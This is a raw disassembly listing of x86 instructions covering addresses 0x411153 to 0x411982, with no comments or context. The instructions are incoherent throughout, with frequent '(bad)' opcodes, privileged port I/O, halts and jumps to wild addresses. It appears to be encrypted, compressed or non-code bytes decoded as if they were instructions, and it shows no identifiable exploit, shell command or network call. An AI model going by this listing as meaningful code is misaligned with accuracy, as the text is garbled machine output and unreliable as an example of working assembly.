  411153:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411154:	les    ebx,FWORD PTR [ecx-0x8b7e6a9]
  41115a:	dec    edi
  41115b:	pop    ss
  41115c:	and    dh,BYTE PTR [edx-0x3a]
  41115f:	push   esi
  411160:	cld    
  411161:	lods   eax,DWORD PTR ds:[esi]
  411162:	scas   eax,DWORD PTR es:[edi]
  411163:	adc    DWORD PTR [edx+edx*2-0x77752f98],edi
  41116a:	into   
  41116b:	cmp    eax,0xf22bb034
  411170:	std    
  411171:	sti    
  411172:	push   0x76
  411174:	pop    ecx
  411175:	xchg   ebx,eax
  411176:	fcmovbe st,st(1)
  411178:	test   BYTE PTR [esi-0x35],bl
  41117b:	dec    esp
  41117c:	jmp    0x4111d9
  41117e:	xlat   BYTE PTR ds:[ebx]
  41117f:	mov    esp,0x2ee06d85
  411184:	xor    ch,BYTE PTR [edi]
  411186:	sbb    al,0x13
  411188:	add    al,0xd5
  41118a:	imul   eax,DWORD PTR [ecx+0x192450de],0x8
  411191:	stos   DWORD PTR es:[edi],eax
  411192:	pop    esi
  411193:	ffreep st(5)
  411195:	cmc    
  411196:	push   ebp
  411197:	(bad)  
  411198:	lock cmp al,0x8e
  41119b:	mov    dl,0xde
  41119d:	cmp    esi,DWORD PTR [ecx-0x53]
  4111a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111a1:	pusha  
  4111a2:	add    ebx,DWORD PTR ds:0xb61c2509
  4111a8:	mov    ah,cl
  4111aa:	repz imul ecx,DWORD PTR [edi+eax*4],0x33a1fb83
  4111b2:	xchg   edi,eax
  4111b3:	out    0xf0,eax
  4111b5:	cli    
  4111b6:	imul   ebp,DWORD PTR [ebx+0x7],0xeec37fed
  4111bd:	add    BYTE PTR [edi+0x5a085701],bl
  4111c3:	lahf   
  4111c4:	adc    dl,BYTE PTR [edi-0x62]
  4111c7:	fiadd  DWORD PTR [edx+0x55]
  4111ca:	mov    BYTE PTR [edx-0x3d828ecd],ah
  4111d0:	mov    ebp,0x776a4c20
  4111d5:	xchg   DWORD PTR [eax],esp
  4111d7:	sub    al,0x50
  4111d9:	mov    ebx,ebp
  4111db:	scas   al,BYTE PTR es:[edi]
  4111dc:	and    al,0xaa
  4111de:	mov    eax,ds:0xeda8f91f
  4111e3:	imul   ecx,DWORD PTR [ecx-0x61],0xffffff83
  4111e7:	mov    ebp,0xeb143797
  4111ec:	mov    edi,0xe370135a
  4111f1:	adc    dh,BYTE PTR [ebp+0x29ab5ceb]
  4111f7:	adc    bl,ah
  4111f9:	pop    ebx
  4111fa:	out    dx,al
  4111fb:	imul   esi,DWORD PTR [edx-0x11],0xffffffe6
  4111ff:	xor    BYTE PTR [edi],cl
  411201:	xchg   ecx,eax
  411202:	popa   
  411203:	mov    ah,0x3c
  411205:	pop    ss
  411206:	mul    DWORD PTR [ecx+ebp*4-0x44]
  41120a:	cmp    al,0x64
  41120c:	out    0xed,eax
  41120e:	test   BYTE PTR [eax-0x53],bl
  411211:	and    al,BYTE PTR [ebp-0x262081c]
  411217:	iret   
  411218:	out    dx,eax
  411219:	pusha  
  41121a:	inc    eax
  41121b:	fs or  eax,0x38be94e0
  411221:	push   ecx
  411222:	mov    ds:0x2200cb28,eax
  411227:	pop    eax
  411228:	push   cs
  411229:	dec    eax
  41122a:	pop    ebx
  41122b:	sbb    eax,0xcc335607
  411230:	daa    
  411231:	aam    0xd3
  411233:	jg     0x411207
  411235:	add    BYTE PTR [esi+0x6dce5977],0x48
  41123c:	xor    bl,BYTE PTR [ebx-0xd40219a]
  411242:	es dec ebp
  411244:	nop
  411245:	pop    ecx
  411246:	adc    al,0x93
  411248:	mov    eax,ds:0xe3c153d9
  41124d:	lea    esp,[ebp-0x72600aec]
  411253:	ds jmp 0x41120e
  411256:	xor    ch,BYTE PTR [ebp+edi*4+0x58]
  41125a:	div    BYTE PTR [esi]
  41125c:	aad    0xbe
  41125e:	popa   
  41125f:	dec    edx
  411260:	sahf   
  411261:	and    ah,BYTE PTR [ebx-0x6129d41b]
  411267:	inc    ebp
  411268:	cmp    al,0x62
  41126a:	cmc    
  41126b:	test   eax,0x273f7def
  411270:	int    0x87
  411272:	and    DWORD PTR [edi-0x22bf018c],eax
  411278:	inc    BYTE PTR [ebx+0x4086135a]
  41127e:	repz in eax,0x4e
  411281:	inc    eax
  411282:	mov    esi,0x78c57830
  411287:	cmp    al,ah
  411289:	mov    eax,0xa29c3e68
  41128e:	cmc    
  41128f:	fimul  WORD PTR [esi-0x78403d34]
  411295:	ja     0x41129f
  411297:	inc    esi
  411298:	jl     0x4112e5
  41129a:	rol    BYTE PTR [esi-0x638babf7],cl
  4112a0:	or     DWORD PTR [ebx-0x5687907f],0xffffff96
  4112a7:	xchg   esp,eax
  4112a8:	push   ebx
  4112a9:	mov    ah,0x34
  4112ab:	dec    ecx
  4112ac:	test   DWORD PTR [esp+ebx*4-0xa65b151],edi
  4112b3:	aaa    
  4112b4:	cli    
  4112b5:	xor    al,0xf
  4112b7:	enter  0x4766,0xc3
  4112bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112bc:	mov    ch,0xe6
  4112be:	ja     0x4112c3
  4112c0:	stos   BYTE PTR es:[edi],al
  4112c1:	push   0x4f
  4112c3:	sahf   
  4112c4:	mov    bh,0xaa
  4112c6:	aaa    
  4112c7:	arpl   WORD PTR [edx-0x4c],bx
  4112ca:	cli    
  4112cb:	jp     0x411286
  4112cd:	xor    edx,DWORD PTR [ecx-0x3bc31872]
  4112d3:	ja     0x41130d
  4112d5:	inc    edi
  4112d6:	sbb    ch,BYTE PTR [esi+0x41]
  4112d9:	mov    esi,0x63cdf5db
  4112de:	and    al,0x66
  4112e0:	mov    ds:0x73394fc5,eax
  4112e5:	imul   ebp,DWORD PTR [ecx],0xffffffbc
  4112e8:	push   edi
  4112e9:	jmp    0x6b525626
  4112ee:	shl    eax,0x64
  4112f1:	add    bl,BYTE PTR [esi]
  4112f3:	xor    DWORD PTR [ebp-0x74146bd],ebp
  4112f9:	adc    eax,0x483a2eea
  4112fe:	scas   eax,DWORD PTR es:[edi]
  4112ff:	std    
  411300:	add    eax,0x9a7f6dd3
  411305:	out    dx,al
  411306:	cs es sbb al,0xe1
  41130a:	xchg   ebp,esi
  41130c:	test   al,0x21
  41130e:	xchg   esi,eax
  41130f:	div    bl
  411311:	xchg   BYTE PTR [edi-0x4fea6180],ch
  411317:	inc    esi
  411318:	pop    ecx
  411319:	jmp    0x99d26b4d
  41131e:	inc    ebp
  41131f:	stos   BYTE PTR es:[edi],al
  411320:	and    BYTE PTR [edi-0x8],bl
  411323:	fisub  WORD PTR [ebx]
  411325:	(bad)  
  411326:	loope  0x411386
  411328:	inc    eax
  411329:	xchg   BYTE PTR [ecx+0x14],bh
  41132c:	xchg   esi,eax
  41132d:	inc    edi
  41132e:	cmp    BYTE PTR [esp+ecx*2+0x79f30d96],ah
  411335:	aaa    
  411336:	push   ebp
  411337:	push   esp
  411338:	sbb    cl,al
  41133a:	lock adc DWORD PTR [ecx-0x554d38bc],eax
  411341:	fmul   DWORD PTR [ebx]
  411343:	ret    0xa938
  411346:	sbb    ah,BYTE PTR [edi+0x6c]
  411349:	ss xchg esp,eax
  41134b:	mov    cl,bh
  41134d:	retf   
  41134e:	sub    edi,0x5d954a77
  411354:	jne    0x41130d
  411356:	(bad)  [eax-0x68c6b8f3]
  41135c:	push   es
  41135d:	fdivr  st(1),st
  41135f:	xchg   ecx,eax
  411360:	jmp    0xbeb2:0xa3adf0c9
  411367:	imul   edx,edx,0xffffff9f
  41136a:	push   0x38d2ef30
  41136f:	jo     0x411301
  411371:	je     0x411351
  411373:	push   ebx
  411374:	cmp    BYTE PTR [ebp+esi*2-0x6b57d410],0xf9
  41137c:	aam    0xa
  41137e:	or     dl,BYTE PTR [ebx-0x7e2ea2fa]
  411384:	iret   
  411385:	dec    esi
  411386:	popa   
  411387:	mov    bl,0xcc
  411389:	sub    eax,0x44a3ed32
  41138e:	(bad)  
  41138f:	fprem1 
  411391:	xchg   ecx,eax
  411392:	shl    DWORD PTR [edi+ecx*4+0x301638c3],1
  411399:	add    BYTE PTR [edi+0x5c],al
  41139c:	cmp    eax,0x7420dd72
  4113a1:	(bad)  
  4113a2:	rcl    BYTE PTR [ebx+0xe],0xbd
  4113a6:	push   esp
  4113a7:	sub    BYTE PTR [ecx-0x7f95fd75],cl
  4113ad:	test   al,0xee
  4113af:	call   0xbd0a:0xfc77428d
  4113b6:	shr    DWORD PTR [ebx-0x1f51a363],0xc0
  4113bd:	or     eax,0xf56d339
  4113c2:	inc    esi
  4113c3:	out    0xac,al
  4113c5:	or     eax,0xe089d8b6
  4113ca:	pushf  
  4113cb:	inc    ebp
  4113cc:	std    
  4113cd:	cmp    dl,0x63
  4113d0:	xor    eax,0x31348ac5
  4113d5:	adc    eax,0x178d4ba9
  4113da:	dec    eax
  4113db:	sahf   
  4113dc:	(bad)  
  4113dd:	(bad)
  4113e0:	xlat   BYTE PTR ds:[ebx]
  4113e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113e2:	push   esi
  4113e3:	cmp    edx,ebx
  4113e5:	fwait
  4113e6:	out    0xfb,al
  4113e8:	repz sub edx,DWORD PTR [edx-0x2c]
  4113ec:	outs   dx,DWORD PTR ds:[esi]
  4113ed:	xchg   bl,bh
  4113ef:	dec    eax
  4113f0:	js     0x411440
  4113f2:	loopne 0x4113e5
  4113f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113f5:	pushf  
  4113f6:	(bad)  
  4113f8:	sub    dl,BYTE PTR [ebp+0x7c010d9d]
  4113fe:	and    cl,ah
  411400:	fmul   QWORD PTR [eax+0x14b99db1]
  411406:	test   eax,0x5097768
  41140b:	jns    0x411448
  41140d:	inc    edi
  41140e:	adc    edi,0x50
  411411:	pop    ss
  411412:	jecxz  0x411449
  411414:	push   esi
  411415:	arpl   WORD PTR [edi-0x54db78df],si
  41141b:	add    BYTE PTR ds:0x49589f86,dl
  411421:	xor    dl,BYTE PTR [eax-0x6bd90158]
  411427:	cdq    
  411428:	jge    0x411462
  41142a:	daa    
  41142b:	jbe    0x4113f7
  41142d:	(bad)  
  41142e:	cmp    BYTE PTR [ecx+eiz*8+0x34],ah
  411432:	int    0x9f
  411434:	popf   
  411435:	add    BYTE PTR [ebp+0x4508b7d5],cl
  41143b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41143c:	inc    edx
  41143d:	out    0x63,al
  41143f:	enter  0x267f,0x1f
  411443:	mov    bl,0x45
  411445:	ja     0x4113f7
  411447:	test   BYTE PTR [ebx],al
  411449:	pop    edx
  41144a:	fdivp  st(0),st
  41144c:	sbb    bh,BYTE PTR [edx-0x2f]
  41144f:	or     BYTE PTR [ebx-0x31],bl
  411452:	ja     0x4113da
  411454:	add    bl,bl
  411456:	nop
  411457:	xor    eax,0x3ec9d7e0
  41145c:	xchg   edi,eax
  41145d:	jl     0x411460
  41145f:	in     eax,dx
  411460:	jge    0x411476
  411462:	inc    esp
  411463:	mov    WORD PTR [ebx-0x63bae93e],cs
  411469:	and    ah,BYTE PTR [ebx+0x5]
  41146c:	repnz hlt 
  41146e:	and    ah,BYTE PTR [eax]
  411470:	loop   0x4114c9
  411472:	mov    eax,fs:0xa5b635bc
  411478:	adc    DWORD PTR [esi-0x2c],0x52b7e219
  41147f:	cli    
  411480:	clc    
  411481:	hlt    
  411482:	and    BYTE PTR [ebx-0x69077c29],bh
  411488:	mov    eax,ds:0xd901fc6f
  41148d:	(bad)  
  41148e:	mov    ds:0x2b642e4d,eax
  411493:	aaa    
  411494:	not    edx
  411496:	sbb    BYTE PTR [edx+0x4d63a339],dl
  41149c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41149d:	mov    ds:0xbcae7f,al
  4114a2:	jmp    0xcbc9dc5d
  4114a7:	inc    esi
  4114a8:	lds    edi,FWORD PTR [ecx+0x47d038c9]
  4114ae:	adc    ecx,DWORD PTR [ebx-0x1d9c2d6b]
  4114b4:	sub    al,0x80
  4114b6:	sub    eax,0x2674e21
  4114bb:	push   edi
  4114bc:	aam    0x7d
  4114be:	or     eax,0x261a0242
  4114c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114c4:	dec    esi
  4114c5:	mov    ds:0xd4adb832,eax
  4114ca:	sub    BYTE PTR [ebx+0x1c],bh
  4114cd:	push   ecx
  4114ce:	push   0x3fd27ef4
  4114d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4114d4:	jnp    0x4114ad
  4114d6:	jno    0x411526
  4114d8:	mov    esp,edx
  4114da:	jmp    0x41147f
  4114dc:	pop    ebx
  4114dd:	(bad)  
  4114de:	push   edx
  4114df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114e0:	adc    cl,BYTE PTR [ebx+0x78]
  4114e3:	jbe    0x4114c1
  4114e5:	jg     0x4114a8
  4114e7:	or     esi,DWORD PTR cs:[eax+0x46]
  4114eb:	scas   eax,DWORD PTR es:[edi]
  4114ec:	sub    edi,DWORD PTR [eax+edx*1-0x7d17158c]
  4114f3:	inc    ebp
  4114f4:	aam    0xf6
  4114f6:	fild   WORD PTR [ebx+eax*8-0x3aaa11e6]
  4114fd:	cmp    BYTE PTR [ebp-0x78c65bea],bl
  411503:	jecxz  0x4114f4
  411505:	(bad)  
  411506:	mov    edx,0xe84c81e3
  41150b:	jbe    0x411538
  41150d:	aas    
  41150e:	mov    ch,0x33
  411510:	push   eax
  411511:	sahf   
  411512:	fild   WORD PTR [ecx+edx*8+0x52]
  411516:	std    
  411517:	pop    esi
  411518:	push   eax
  411519:	push   ecx
  41151a:	sar    dh,0x32
  41151d:	(bad)  
  41151e:	add    DWORD PTR [edx+0x3817454f],eax
  411524:	pop    DWORD PTR [eax+edx*1]
  411527:	and    DWORD PTR [edx+0x46],edi
  41152a:	clc    
  41152b:	mov    ds:0xc40228c1,al
  411530:	mov    BYTE PTR [eax+0x67],al
  411533:	test   DWORD PTR [ecx],edi
  411535:	xlat   BYTE PTR ds:[ebx]
  411536:	jge    0x41158f
  411538:	scas   eax,DWORD PTR es:[edi]
  411539:	xor    eax,0x68a26180
  41153e:	cmp    eax,DWORD PTR [ebx+0x57]
  411541:	mov    ecx,0xe4d9d08
  411546:	shl    BYTE PTR [ebx-0x4e],cl
  411549:	sbb    eax,0x7d538b23
  41154e:	and    al,0xe2
  411550:	ret    
  411551:	and    cl,BYTE PTR [esi+0x69b95f5a]
  411557:	data16 mov bh,0x53
  41155a:	push   ecx
  41155b:	jmp    0xfe1e535c
  411560:	xor    al,0x90
  411562:	sub    al,BYTE PTR [ecx+0x6f]
  411565:	jle    0x411527
  411567:	sub    al,0x47
  411569:	enter  0xc1ef,0x3e
  41156d:	pop    edi
  41156e:	sub    DWORD PTR [esp+ecx*2+0x78da445b],ebx
  411575:	and    bh,BYTE PTR [ebp-0xf]
  411578:	test   bh,ah
  41157a:	inc    esi
  41157b:	add    al,0x2c
  41157d:	enter  0xfc7a,0x2f
  411581:	icebp  
  411582:	test   BYTE PTR [esi+0x6b],bh
  411585:	xchg   edx,eax
  411586:	pop    edi
  411587:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411588:	rcr    BYTE PTR [esi],1
  41158a:	les    edx,FWORD PTR [eax]
  41158c:	int3   
  41158d:	cdq    
  41158e:	or     dl,BYTE PTR [esi]
  411590:	and    dl,0x81
  411593:	call   FWORD PTR [ebp+0x50]
  411596:	or     edx,DWORD PTR [eax]
  411598:	xchg   ebp,eax
  411599:	jns    0x4115ad
  41159b:	mov    ebx,0xb04fb289
  4115a0:	add    BYTE PTR [eax+0x4ba89352],0xc2
  4115a7:	or     BYTE PTR [edx],al
  4115a9:	push   edi
  4115aa:	push   es
  4115ab:	clc    
  4115ac:	xor    al,0xcc
  4115ae:	(bad)  
  4115af:	mov    bh,0x95
  4115b1:	fdivr  st(3),st
  4115b3:	mov    ecx,0x938b64d5
  4115b8:	jo     0x4115f9
  4115ba:	mov    esp,0xb60cbbe1
  4115bf:	pop    es
  4115c0:	mov    ebx,0x4c5653fd
  4115c5:	inc    ebx
  4115c6:	xor    DWORD PTR [ecx+edx*1-0x1f],esp
  4115ca:	loopne 0x41159c
  4115cc:	cli    
  4115cd:	jp     0x4115d9
  4115cf:	adc    BYTE PTR [ecx-0x4b],dh
  4115d2:	in     al,dx
  4115d3:	in     al,dx
  4115d4:	(bad)  
  4115d5:	daa    
  4115d6:	mov    ds:0x2126db9b,eax
  4115db:	in     eax,dx
  4115dc:	(bad)  [edi-0x49]
  4115df:	ins    DWORD PTR es:[edi],dx
  4115e0:	xor    cl,BYTE PTR [edx]
  4115e2:	or     ebx,ebx
  4115e4:	loop   0x411628
  4115e6:	push   0x99efc08f
  4115eb:	xchg   edi,eax
  4115ec:	stos   DWORD PTR es:[edi],eax
  4115ed:	inc    ecx
  4115ee:	bound  esi,QWORD PTR [edi-0x1be64028]
  4115f4:	push   edx
  4115f5:	jge    0x411582
  4115f7:	jne    0x4115ff
  4115f9:	loope  0x411661
  4115fb:	loope  0x41165f
  4115fd:	loope  0x4115ef
  4115ff:	ja     0x4115cc
  411601:	jge    0x41162c
  411603:	add    ch,BYTE PTR [ebp+0x73db9046]
  411609:	push   ecx
  41160a:	imul   ecx,DWORD PTR [edx+ebp*8+0x31],0xa37ff4ba
  411612:	mov    dh,0x57
  411614:	inc    edx
  411615:	mov    BYTE PTR [edi],dl
  411617:	dec    esp
  411618:	xor    cl,bl
  41161a:	fdivr  st(0),st
  41161c:	sbb    eax,DWORD PTR ds:0x68b8d8dd
  411622:	and    DWORD PTR [edi-0x527785c],esp
  411628:	or     eax,0x38538cd3
  41162d:	out    0xe5,al
  41162f:	or     dl,BYTE PTR [ebp+eax*1-0xc]
  411633:	push   0xffffff8b
  411635:	mov    bl,0x9e
  411637:	sahf   
  411638:	js     0x4115c3
  41163a:	cmp    edx,DWORD PTR ds:0x54aadaec
  411640:	and    al,0x99
  411642:	cmp    DWORD PTR [ecx-0x61dc95ea],0x5c
  411649:	mov    bh,0x4e
  41164b:	xchg   esp,eax
  41164c:	jb     0x4116b1
  41164e:	sbb    edx,DWORD PTR [ecx+0x7b66f24f]
  411654:	jne    0x411625
  411656:	mov    WORD PTR [ecx+0xa],gs
  411659:	sbb    al,0x4f
  41165b:	jecxz  0x411649
  41165d:	mov    cl,0x8f
  41165f:	mov    esi,0xe5c90556
  411664:	aam    0x29
  411666:	ret    0x77db
  411669:	shr    BYTE PTR [ebx+eiz*1-0x4c6c3783],cl
  411670:	jge    0x4116be
  411672:	shl    DWORD PTR [edx-0x4d],0x3a
  411676:	jg     0x411617
  411678:	sub    eax,ebx
  41167a:	and    bh,BYTE PTR [ecx-0x3e]
  41167d:	retf   0xaf52
  411680:	push   ecx
  411681:	push   ds
  411682:	mov    ebp,ecx
  411684:	mov    ah,0x7c
  411686:	cmp    DWORD PTR [edi],esp
  411688:	jbe    0x4116e0
  41168a:	cs pop ecx
  41168c:	xor    al,0x6a
  41168e:	aam    0x22
  411690:	adc    al,bh
  411692:	out    0xa6,eax
  411694:	mov    cl,0x6f
  411696:	mov    al,ds:0x7d4d7ceb
  41169b:	lea    ecx,[edi+0x1c08bf49]
  4116a1:	lahf   
  4116a2:	loopne 0x41170a
  4116a4:	aad    0x3
  4116a6:	sahf   
  4116a7:	adc    al,BYTE PTR [edx-0x69ed29e5]
  4116ad:	dec    edi
  4116ae:	sub    DWORD PTR [esi+esi*4+0x2d2f8101],ebp
  4116b5:	pushf  
  4116b6:	popa   
  4116b7:	cmp    DWORD PTR [edx+0x61ae9702],edi
  4116bd:	inc    ebp
  4116be:	js     0x411664
  4116c0:	push   ebx
  4116c1:	in     al,dx
  4116c2:	addr16 pop eax
  4116c4:	into   
  4116c5:	ja     0x4116cc
  4116c7:	ds push ecx
  4116c9:	icebp  
  4116ca:	test   DWORD PTR [esi-0x8f701fa],0x7b036ade
  4116d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116d5:	ja     0x4116bf
  4116d7:	cmp    ecx,DWORD PTR [ecx-0x32]
  4116da:	jl     0x411720
  4116dc:	sti    
  4116dd:	jne    0x411710
  4116df:	cmp    DWORD PTR [esi+edx*8-0x2],0xd203930
  4116e7:	arpl   WORD PTR [ebp+0x513052df],cx
  4116ed:	dec    esi
  4116ee:	push   edi
  4116ef:	mov    DWORD PTR ss:[esi],ebx
  4116f2:	icebp  
  4116f3:	mov    ebp,DWORD PTR ds:0xda01750a
  4116f9:	mov    eax,ds:0x5a8a5b7e
  4116fe:	imul   ebx,eax,0xffffffc2
  411701:	cmp    al,0x1e
  411703:	sub    al,0x3b
  411705:	push   ebx
  411706:	inc    edx
  411707:	and    ebx,edi
  411709:	xor    ecx,0xbae2dd87
  41170f:	push   eax
  411710:	mov    bl,cl
  411712:	push   edi
  411713:	arpl   sp,di
  411715:	shl    DWORD PTR [ecx],0x74
  411718:	test   BYTE PTR [esi-0x2],cl
  41171b:	nop
  41171c:	rcl    DWORD PTR [ecx+0x3e09c1bb],cl
  411722:	jae    0x4116df
  411724:	repnz not DWORD PTR [ecx-0x4c]
  411728:	push   ss
  411729:	push   ss
  41172a:	fdiv   QWORD PTR [ecx+0x63]
  41172d:	adc    bl,ah
  41172f:	retf   
  411730:	jp     0x411754
  411732:	sbb    eax,0x69eba716
  411737:	adc    ah,BYTE PTR [eax+0x568a8481]
  41173d:	xor    edi,eax
  41173f:	into   
  411740:	fsub   QWORD PTR [ebx+edx*1]
  411743:	pop    eax
  411744:	test   ebp,esi
  411746:	push   0xffffff8c
  411748:	mov    edx,0x72e50b13
  41174d:	das    
  41174e:	test   DWORD PTR [ecx+esi*2],ecx
  411751:	jb     0x411714
  411753:	(bad)
  411758:	mov    bl,0xd6
  41175a:	add    DWORD PTR [esp+ebx*2+0x2c90cfea],edi
  411761:	jecxz  0x41177e
  411763:	push   0x648f1227
  411768:	gs jno 0x4117cb
  41176b:	and    edi,edx
  41176d:	and    BYTE PTR [edi],bh
  41176f:	mov    ds:0x996e909c,eax
  411774:	cld    
  411775:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  411777:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411778:	or     bl,BYTE PTR [esp+eax*2-0x1a]
  41177c:	xchg   eax,edx
  41177e:	cmp    al,0x10
  411780:	jl     0x411768
  411782:	sbb    eax,0xf38301b6
  411787:	hlt    
  411788:	mov    ebx,DWORD PTR [ecx]
  41178a:	call   0xd9407af2
  41178f:	jg     0x4117ae
  411791:	push   ss
  411792:	inc    ebx
  411793:	xchg   esi,eax
  411794:	(bad)  
  411795:	in     al,0xb2
  411797:	arpl   WORD PTR [ecx],cx
  411799:	mov    ah,0x58
  41179b:	and    eax,0x885b09d4
  4117a0:	dec    ebp
  4117a1:	sar    DWORD PTR [edx+0x660480f6],0x2d
  4117a8:	xlat   BYTE PTR ds:[ebx]
  4117a9:	sub    eax,0x9451b763
  4117ae:	adc    edx,edx
  4117b0:	fdiv   st,st(0)
  4117b2:	inc    edi
  4117b3:	jecxz  0x4117ed
  4117b5:	imul   ebx,DWORD PTR [ecx-0x6f],0xec1bdfe8
  4117bc:	dec    edx
  4117bd:	cmp    bl,BYTE PTR [esi-0x7a492304]
  4117c3:	jbe    0x4117b7
  4117c5:	xchg   BYTE PTR [esi+0x7b],bh
  4117c8:	(bad)  
  4117c9:	stos   BYTE PTR es:[edi],al
  4117ca:	cmp    ebp,ebp
  4117cc:	mov    edx,0x590c234
  4117d1:	dec    edi
  4117d2:	or     BYTE PTR [esi-0x55],bl
  4117d5:	call   0xc28e:0x8fd9801f
  4117dc:	xor    al,0x59
  4117de:	ja     0x411786
  4117e0:	xchg   ebx,eax
  4117e1:	mov    dh,0x26
  4117e3:	sub    al,0xc3
  4117e5:	mov    db7,edi
  4117e8:	rcr    BYTE PTR es:[edx],cl
  4117eb:	pop    esp
  4117ec:	pcmpgtd mm7,QWORD PTR [ebx-0x41]
  4117f0:	mov    ds:0x3b6a2da6,al
  4117f5:	push   ebx
  4117f6:	test   al,0x9c
  4117f8:	in     eax,0xfc
  4117fa:	in     eax,dx
  4117fb:	sbb    BYTE PTR [ecx],ch
  4117fd:	inc    edi
  4117fe:	add    BYTE PTR [ebp+0x184a90d1],dl
  411804:	and    eax,0xe8b07ec5
  411809:	sub    BYTE PTR [edi-0x240a5ba6],ah
  41180f:	call   0x44cb:0x8f38bcc6
  411816:	lods   al,BYTE PTR ds:[esi]
  411817:	cmp    bl,cl
  411819:	cmp    BYTE PTR [ebx+0x33],dh
  41181c:	inc    ecx
  41181d:	push   esp
  41181e:	jg     0x41184c
  411820:	fstp   TBYTE PTR [ebp+0xd]
  411823:	in     eax,0x48
  411825:	test   ch,ah
  411827:	and    eax,0x33e410d6
  41182c:	pushf  
  41182d:	aam    0x8c
  41182f:	sbb    ecx,ebp
  411831:	dec    esp
  411832:	test   DWORD PTR [ebx-0x45],0xd881c7fe
  411839:	push   ecx
  41183a:	pop    ebp
  41183b:	push   ds
  41183c:	gs push ebp
  41183e:	push   edi
  41183f:	xchg   esp,eax
  411840:	adc    eax,0x1873e554
  411845:	cmp    cl,dh
  411847:	xor    ebx,ebx
  411849:	add    esi,ecx
  41184b:	adc    ebx,0xffffffff
  41184e:	xor    edi,edi
  411850:	xor    esi,eax
  411852:	xor    ebx,0x0
  411855:	jmp    0x413be9
  41185a:	pop    ss
  41185b:	push   edx
  41185c:	mov    al,0x83
  41185f:	aam    0xe3
  411861:	imul   ebx,DWORD PTR [eax+0x68],0xcb30ba54
  411868:	sahf   
  411869:	(bad)  
  41186a:	hlt    
  41186b:	push   0x62
  41186d:	(bad)  
  41186e:	jmp    0x4118cf
  411870:	bound  esp,QWORD PTR [edx+0x8]
  411873:	push   edi
  411874:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411875:	pop    esp
  411876:	lds    ebp,FWORD PTR ds:0x9da15264
  41187c:	test   BYTE PTR [esp+ecx*1+0x752cc168],bh
  411883:	dec    edi
  411884:	aas    
  411885:	pop    edi
  411886:	mov    eax,ds:0x4da3295
  41188b:	lds    esi,FWORD PTR [edi-0x18214bc9]
  411891:	lods   eax,DWORD PTR ds:[esi]
  411892:	mov    ebp,0x8ea6badb
  411897:	out    dx,eax
  411898:	mov    esp,cs
  41189a:	outs   dx,BYTE PTR ds:[esi]
  41189b:	mov    cl,0x8b
  41189d:	int3   
  41189e:	mov    ecx,0xa17b24a0
  4118a3:	(bad)  
  4118a5:	cmp    WORD PTR [eax],dx
  4118a8:	cmp    eax,0x7062b7c9
  4118ad:	mov    ah,BYTE PTR [eax-0x15450030]
  4118b3:	out    dx,al
  4118b4:	and    DWORD PTR [ecx-0x27],esp
  4118b7:	into   
  4118b8:	addr16 mov edx,0x80a8d45a
  4118be:	nop
  4118bf:	js     0x411923
  4118c1:	scas   al,BYTE PTR es:[edi]
  4118c2:	dec    eax
  4118c3:	jecxz  0x41185a
  4118c5:	jns    0x411941
  4118c7:	in     eax,dx
  4118c8:	jnp    0x41184e
  4118ca:	push   ebx
  4118cb:	push   edi
  4118cc:	js     0x41187a
  4118ce:	mov    ebx,0x58eab75c
  4118d3:	mov    al,0xa
  4118d5:	sbb    BYTE PTR [ebx-0x25b037b3],0xd3
  4118dc:	mov    ds:0xe74d3097,eax
  4118e1:	ror    bh,cl
  4118e3:	test   DWORD PTR [esi+0x4236a158],esp
  4118e9:	pop    esp
  4118ea:	into   
  4118eb:	mov    edx,0xf04a75e8
  4118f0:	leave  
  4118f1:	jmp    0x4118e3
  4118f3:	cmp    eax,0xacc0e957
  4118f8:	xchg   esi,eax
  4118f9:	sbb    eax,0xb0ccdd56
  4118fe:	sub    eax,0x66ec473e
  411903:	inc    ebp
  411904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411905:	sbb    al,0xf4
  411907:	jbe    0x411950
  411909:	adc    dh,dl
  41190b:	cli    
  41190c:	repz adc al,BYTE PTR [ecx+0x21]
  411910:	and    BYTE PTR [ebx],0xc2
  411913:	jl     0x4118fe
  411915:	jecxz  0x411903
  411917:	stos   BYTE PTR es:[edi],al
  411918:	xor    DWORD PTR [ecx+eiz*2-0xd],0x7e
  41191d:	(bad)  
  41191e:	std    
  41191f:	pop    ds
  411920:	pop    esi
  411921:	sbb    DWORD PTR [edi+0x832ab9d],esi
  411927:	push   esi
  411928:	and    BYTE PTR [esp+ecx*8],0x9b
  41192c:	xchg   BYTE PTR [edi+eiz*1-0x4c333d77],dl
  411933:	push   0xfffffffc
  411935:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411936:	push   0x235b6c20
  41193b:	call   ecx
  41193d:	dec    esp
  41193e:	mov    eax,ds:0x9bdefe0
  411943:	dec    eax
  411944:	ret    0x8ab8
  411947:	imul   eax,DWORD PTR [edx],0x6ed8ae68
  41194d:	mov    BYTE PTR [edx+0x4699e732],0xec
  411954:	outs   dx,DWORD PTR ds:[esi]
  411955:	jns    0x4118db
  411957:	jb     0x411970
  411959:	and    al,0x1f
  41195b:	mov    eax,ds:0xbe7562c3
  411960:	dec    edi
  411961:	lods   al,BYTE PTR ds:[esi]
  411962:	jp     0x411981
  411964:	and    BYTE PTR [ebx-0x1c41deef],0xc5
  41196b:	sub    BYTE PTR [ecx-0xb9775a4],bh
  411971:	test   DWORD PTR [esi],0x686a4f9b
  411977:	push   esi
  411978:	retf   
  411979:	mov    cl,0x9
  41197b:	rol    BYTE PTR [eax-0x65629afb],1
  411981:	out    dx,eax
  411982:	push   edi
